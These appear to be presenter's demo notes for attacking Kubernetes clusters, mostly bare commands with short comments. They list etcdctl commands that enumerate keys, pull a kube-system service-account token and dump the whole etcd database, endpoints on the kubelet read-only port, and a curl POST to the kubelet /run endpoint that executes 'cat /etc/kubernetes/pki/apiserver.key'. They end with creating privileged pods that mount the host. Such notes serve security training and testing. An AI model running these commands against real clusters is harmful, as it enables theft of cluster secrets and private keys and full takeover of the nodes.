# Demo Notes

## Attacking etcd

export ETCDCTL_API=3

etcdctl --endpoints=http://192.168.200.10:2379 get / --prefix --keys-only

Lists all the keys in the database

etcdctl --endpoints=http://192.168.200.10:2379 get /registry/secrets/kube-system/default-token-j9sgh

Pulls a secret out of the database


etcdctl --endpoints=http://192.168.200.10:2379 snapshot save test2.db

This dumps the etcd database into a file.  It's not pure text however things like service account tokens are stored in there, so it should be relatively easy to extract that information from the system.



##  Attacking the Kubelet

There are two ports which are commonly listening relating to the kubelet. 

10250/TCP - Read/Write access
10255/TCP - Read only access.

attacking the readonly port we can get more info. disclosure

/pods
/metrics
/stats/summary
/spec/

so http://knode1:10255/pods can provide us some interesting information. including things like the fact that privileged containers are permitted and the insecure port is available!.

Attacking the main kubelet port we can do a lot more, if it's exposed.

https://knode1:10250/containerLogs/kube-system/kube-apiserver-kubeadm1/kube-apiserver/

curl -k -XPOST "https://192.168.200.10:10250/run/kube-system/kube-apiserver-kubeadm1/kube-apiserver" -d "cmd=cat /etc/kubernetes/pki/apiserver.key"

# Using Service Tokens

kubectl create -f badcontainer.yml

No config needed, it just knows where to go.

## Abusing user rights

Unless items like podsecuritypolicy have been deployed to the cluster it's possible to run prvileged containers and also to mount in volumes from the host.
 
kubectl create -f privpod.yml

cd /node
